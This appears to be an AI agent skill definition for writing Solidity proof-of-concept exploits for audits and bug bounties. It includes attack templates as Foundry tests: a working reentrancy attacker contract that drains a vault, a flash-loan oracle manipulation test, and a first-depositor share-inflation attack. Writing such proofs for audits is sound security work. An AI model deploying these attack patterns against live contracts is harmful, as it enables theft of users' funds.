---
name: hiauditagent-poc
description: Proof of Concept exploit writing for Solidity vulnerabilities. Triggers on hiauditagent poc, hiauditagent prove, hiauditagent exploit, or hiauditagent demonstrate.
---

# HiAuditAgent PoC Writer

Creates deterministic, minimal proof-of-concept exploits that unambiguously demonstrate vulnerability impact. Every PoC proves exploitability through assertions alone - clean, reproducible, and ready for submission to bug bounties or audit contests.

## When to Activate

- User wants to prove a vulnerability exists
- User asks for a PoC or exploit
- User wants to demonstrate an attack

## When NOT to Use

- User hasn't identified the vulnerability yet (→ hiauditagent-analyzer)
- User wants to validate a hypothesis first (→ hiauditagent-validate)
- User wants a report without PoC (→ hiauditagent-report)

**Do NOT** run HiAuditAgent analysis - user already found the bug.

## Process

1. **Understand** - What's the bug? What's the attack outcome? What invariant is violated?
2. **Scope** - What preconditions are needed? What's the minimal setup?
3. **Find existing tests** - Look in `test/` for existing setup, fixtures, and helpers
4. **Write PoC** - Add to existing test file OR create new if none exists
5. **Security review the PoC** - Verify it actually proves what it claims
6. **Run** - Execute and show result

## PoC Quality Standards

### 1. Deterministic Reproduction

```
Every PoC must be:
- Reproducible: Same result on every run (no randomness, no timing dependency)
- Self-contained: All setup included (no manual steps outside the test)
- Isolated: Does not depend on external network state or live contracts
- Minimal: Smallest possible code that demonstrates the vulnerability
```

### 2. Assertions Over Output

**Assertions prove the vulnerability. Console output proves nothing.**

```solidity
// CORRECT - assertions that prove impact
assertGt(attacker.balance, initialBalance, "Attacker should profit");
assertEq(vault.balance, 0, "Vault should be drained");
assertLt(victim.balance, victimInitial, "Victim lost funds");

// WRONG - console spam that adds nothing
console.log("=== ATTACK RESULTS ===");
console.log("Attacker profit:", profit);
console.log("VULNERABILITY PROVEN");
```

### 3. Real Contracts, No Mocks

```
- NEVER mock or simulate the vulnerable contract
- ALWAYS use the actual contract with real deployment
- Use project's existing deployment/fixture setup
- Mock ONLY external dependencies that are impossible to set up (oracles, other protocols)
- When mocking externals, document WHY and ensure mock behavior matches reality
```

### 4. Minimal Attack Surface

```
The PoC should demonstrate the MINIMUM viable attack:
- Fewest transactions possible
- Simplest attacker contract (if one is needed)
- No unnecessary complexity or "bonus" attacks
- One vulnerability per PoC (don't chain unless the chain IS the finding)
```

## PoC Structure

```solidity
function test_<VulnType>_<WhatItProves>_PoC() public {
    // --- Preconditions ---
    // Document what state is required for the attack
    uint256 attackerBalanceBefore = address(attacker).balance;
    uint256 vaultBalanceBefore = address(vault).balance;

    // 1. Setup initial state
    // ... minimal setup to reach vulnerable code path ...

    // 2. Execute attack
    // ... the actual exploit ...

    // 3. Verify impact via assertions
    uint256 attackerBalanceAfter = address(attacker).balance;
    assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker profited");
    assertEq(address(vault).balance, 0, "Vault drained completely");
}
```

## Attack Pattern Templates

### Reentrancy PoC

```solidity
contract ReentrancyAttacker {
    VulnerableContract target;
    uint256 attackCount;

    constructor(address _target) {
        target = VulnerableContract(_target);
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (attackCount < 1) {
            attackCount++;
            target.withdraw(msg.value);
        }
    }
}

function test_Reentrancy_Withdraw_PoC() public {
    // 1. Setup
    uint256 depositAmount = 1 ether;
    vm.deal(address(attacker), depositAmount);
    vm.deal(address(vault), 10 ether); // other users' deposits

    uint256 vaultBefore = address(vault).balance;

    // 2. Attack
    vm.prank(address(attacker));
    attacker.attack{value: depositAmount}();

    // 3. Verify: attacker withdrew more than deposited
    assertGt(address(attacker).balance, depositAmount, "Attacker extracted extra funds");
    assertLt(address(vault).balance, vaultBefore, "Vault lost funds beyond attacker's deposit");
}
```

### Flash Loan Price Manipulation PoC

```solidity
function test_FlashLoan_OracleManipulation_PoC() public {
    // 1. Record healthy position
    uint256 healthFactor = lending.getHealthFactor(victim);
    assertGt(healthFactor, 1e18, "Position starts healthy");

    // 2. Flash loan to manipulate price
    vm.prank(attacker);
    flashLender.flashLoan(attacker, token, largeAmount, "");
    // Inside callback: dump tokens to crash price, liquidate, repay

    // 3. Verify: victim liquidated despite being healthy
    assertLt(lending.getHealthFactor(victim), 1e18, "Position incorrectly liquidatable");
}
```

### First Depositor / Share Inflation PoC

```solidity
function test_FirstDepositor_ShareInflation_PoC() public {
    // 1. Attacker is first depositor with tiny amount
    vm.prank(attacker);
    vault.deposit(1);

    // 2. Attacker donates large amount to inflate share price
    vm.prank(attacker);
    token.transfer(address(vault), 1e18);

    // 3. Victim deposits reasonable amount
    vm.prank(victim);
    vault.deposit(2e18);

    // 4. Verify: victim got 0 or far fewer shares than expected
    uint256 victimShares = vault.balanceOf(victim);
    assertEq(victimShares, 0, "Victim received zero shares due to rounding");
    // OR
    assertLt(victimShares, expectedShares / 2, "Victim lost >50% to share inflation");
}
```

## Console Output Rules (STRICT)

**NEVER use console.log/emit for:**
- Celebration/confirmation: `"CONFIRMED"`, `"VULNERABILITY FOUND"`, `"SUCCESS"`
- Banners: `"=== Results ==="`, `"--- Attack ---"`, `"******"`
- Explanatory text: `"Impact: funds stolen"`, `"Attack complete"`
- Checkmarks, emojis, X marks, or decorative output
- Summaries of what happened

**Only acceptable console output:**
- Debugging values during development (remove before final version)
- Complex multi-step traces when assertion alone is insufficient to understand the attack flow

**Why:** The PoC is evidence, not a presentation. Assertions are machine-verifiable proof. Console output is noise that makes the PoC harder to review and maintain.

## File Placement and Naming

### Prefer Existing Test Infrastructure
```
1. Look in test/ for existing test files for the vulnerable contract
2. If VaultTest exists, add your PoC function there (use dev's setup)
3. If no test exists, create new file following project conventions
4. Match naming: project uses .t.sol → use .t.sol, project uses .test.js → use .test.js
```

### Naming Convention
```
Test function: test_<VulnType>_<Target>_PoC
               test_Reentrancy_Withdraw_PoC
               test_FlashLoan_PriceManipulation_PoC
               test_ShareInflation_FirstDepositor_PoC

Attacker contract: <VulnType>Attacker
                   ReentrancyAttacker
                   FlashLoanAttacker

File (if new):  test/PoC_<VulnType>_<Contract>.t.sol
                test/PoC_Reentrancy_Vault.t.sol
```

## Framework Detection

**Foundry:** Look for `foundry.toml` → use `forge test --match-test <test_name> -vvvv`
**Hardhat:** Look for `hardhat.config.js/ts` → use `npx hardhat test --grep "<test_name>"`

## Pre-Submission Checklist

Before finalizing PoC:
- [ ] Test name is descriptive: `test_<VulnType>_<Target>_PoC`
- [ ] Zero console output with decorative text, banners, or celebration
- [ ] Numbered step comments (`// 1.`, `// 2.`, `// 3.`)
- [ ] Assertions prove the impact (not console.log)
- [ ] Preconditions documented (what state is required)
- [ ] Real contracts used (no mocks of vulnerable contract)
- [ ] Deterministic: no randomness, no timing dependencies
- [ ] Self-contained: all setup within the test or its setUp()
- [ ] Minimal: no unnecessary complexity beyond what proves the bug
- [ ] Impact quantified in assertions (how much lost, what state changed)
- [ ] Attack contract is minimal and well-commented
- [ ] PoC runs successfully: `forge test --match-test <name> -vvvv`

## Output

Keep it minimal:

```
PoC written: test/Vault.t.sol::test_Reentrancy_Withdraw_PoC

Attack flow:
1. Attacker deposits 1 ETH
2. Attacker calls withdraw, re-enters via receive()
3. Vault drained of all 10 ETH

Run: forge test --match-test test_Reentrancy_Withdraw_PoC -vvvv
```

After running, report: **Confirmed** (with assertion results) or **Could not reproduce** (with specific reason and what was tried).

## Rationalizations to Reject

| Rationalization | Why It's Wrong |
|-----------------|----------------|
| "Console output helps explain the attack" | That's what the report is for. PoC proves, report explains. |
| "It confirms the test passed" | Assertions + test framework already confirm this. |
| "It makes the output clearer" | It makes it noisy. Clean PoC = assertions only. |
| "Just a few logs won't hurt" | They train bad habits and pollute output. Zero tolerance. |
| "I'll mock the vulnerable contract for simplicity" | Then you haven't proven the actual contract is vulnerable. Use real code. |
| "The setup is too complex, I'll simplify" | Find the project's existing test setup. Don't reinvent fixtures. |
| "I'll add extra attack steps to show thoroughness" | Minimal PoC is more convincing. One bug, one proof. |
| "The PoC works, no need for cleanup" | Review it. Does every assertion prove what it claims? Is there dead code? |
